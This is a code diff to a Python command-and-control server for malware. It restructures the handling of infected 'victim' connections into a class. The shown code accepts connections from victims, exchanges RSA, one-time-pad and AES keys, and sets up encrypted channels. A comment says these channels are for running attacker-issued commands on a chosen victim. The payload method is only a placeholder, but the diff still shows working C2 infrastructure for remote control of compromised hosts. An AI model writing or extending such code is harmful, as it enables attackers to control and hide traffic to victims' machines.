@@ -35,71 +35,89 @@ def applyOTP(OTP, KEY):
 sock = socket.socket()
 sock.bind(('127.0.0.1',PORT_SVR))
 sock.listen(1)
-conn, addr = sock.accept()
 
 ######################################################################################
 ######################################################################################
-#               BEGIN CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                    #
+#   Set up a class object, This class object will contain all elements for a         #
+#   connection to be established and maintained. these objects will be contained     #
+#   within a list of established connections, A listener thread will execute         #
+#   attacker issued commands on the selected victim. an additional thread will be    #
+#   established to process the list to get information on each connection, this      #
+#                                                                                    #
+#   constructs a victim object with the following attributes                         #
+#   conn                                                                             #
+#   addr                                                                             #
+#   SessionKey                                                                       #
+#   SessionIV                                                                        #
 ######################################################################################
 ######################################################################################
-
-print("C2 Server >> Victim",addr,'connected')
-OTPPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
-if(conn.send(b"\x01") != 1):
-    print("An error has occured in this connection before the EncryptedOTP could be recieved");
-    sys.exit(-1)
-EncryptedOTP = conn.recv(OTPPacketLen)
-rsaKey = RSA.import_key(PRVKEY)
-cipher = PKCS1_v1_5.new(rsaKey)
-OTP = cipher.decrypt(EncryptedOTP,"failed")
-aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)      
-OTPencodedAESKey = applyOTP(OTP,aesKey)
-conn.send(OTPencodedAESKey);
-# initiate the session key
-SessionKeyPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
-if(conn.send(b"\x01") != 1):
-    print("An error has occured in this connection before the EncryptedOTP could be recieved");
-    sys.exit(-1)
-EncryptedKey = conn.recv(SessionKeyPacketLen)
-SessionKey = cipher.decrypt(EncryptedKey,"failed")
-if(conn.send(b"\x01") != 1):
-    print("An error has occured in this connection before the EncryptedOTP could be recieved");
-    sys.exit(-1)
-SessionIV = conn.recv(16);
-if(conn.send(b"\x01") != 1):
-    print("An error has occured in this connection before the EncryptedOTP could be recieved");
-    sys.exit(-1)
-
-def secure_send(buf: bytes,length: int):
-    global SessionIV
-    # Synchronize Buffer
-    conn.recv(1)
-    sessionCipher = AES.new(SessionKey, AES.MODE_CFB, SessionIV)
-    conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
-    # Synchronize buffer
-    conn.recv(1)
-    ciphertext = sessionCipher.encrypt(buf);
-    # send the cipher text back to the client
-    # the session IV has allready been updated in this instance. 
-    conn.send(ciphertext)
-    SessionIV = conn.recv(16)
    
-def secure_recv():
-    global SessionIV
-    sessionCipher = AES.new(SessionKey, AES.MODE_CFB, SessionIV)
-    msgSZ = int.from_bytes(conn.recv(8),byteorder='big',signed=False) 
-    if(conn.send(b"\x01") != 1):
-        print("An error has occured in this connection before the EncryptedOTP could be recieved")
-        sys.exit(-1)
-    MSG = conn.recv(msgSZ)
-    if(conn.send(b"\x01") != 1):
-        print("An error has occured in this connection before the EncryptedOTP could be recieved")
-        sys.exit(-1)    
-    plaintext = sessionCipher.decrypt(MSG[16:])
-    SessionIV = MSG[:16]
-    return plaintext;
-    
-    
+
+class victim(object):
+    ######################################################################################
+    ######################################################################################
+    #               BEGIN CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                    #
+    ######################################################################################
+    ######################################################################################
+    def __init__(self):
+        self.conn, self.addr = sock.accept()
+        print("C2 Server >> Victim",self.addr,'connected')
+        OTPPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
+        if(self.conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved");
+            sys.exit(-1)
+        EncryptedOTP = self.conn.recv(OTPPacketLen)
+        rsaKey = RSA.import_key(PRVKEY)
+        cipher = PKCS1_v1_5.new(rsaKey)
+        OTP = cipher.decrypt(EncryptedOTP,"failed")
+        aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)      
+        OTPencodedAESKey = applyOTP(OTP,aesKey)
+        self.conn.send(OTPencodedAESKey);
+        # initiate the session key
+        SessionKeyPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
+        if(self.conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved");
+            sys.exit(-1)
+        EncryptedKey = self.conn.recv(SessionKeyPacketLen)
+        self.SessionKey = cipher.decrypt(EncryptedKey,"failed")
+        if(self.conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved");
+            sys.exit(-1)
+        self.SessionIV = self.conn.recv(16);
+        if(self.conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved");
+            sys.exit(-1)
+    def payload(self):
+        print("place holder")
+ 
+    def secure_send(self,buf: bytes,length: int):
+        # Synchronize Buffer
+        self.conn.recv(1)
+        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
+        self.conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
+        # Synchronize buffer
+        self.conn.recv(1)
+        ciphertext = sessionCipher.encrypt(buf);
+        # send the cipher text back to the client
+        # the session IV has allready been updated in this instance. 
+        self.conn.send(ciphertext)
+        self.SessionIV = self.conn.recv(16)
+       
+    def secure_recv(self):  
+        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
+        msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False) 
+        if(self.conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved")
+            sys.exit(-1)
+        MSG = self.conn.recv(msgSZ)
+        if(self.conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved")
+            sys.exit(-1)    
+        plaintext = sessionCipher.decrypt(MSG[16:])
+        self.SessionIV = MSG[:16]
+        return plaintext;
+
+#victim();
 ######################################################################################
 ######################################################################################
 #               END CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                      #
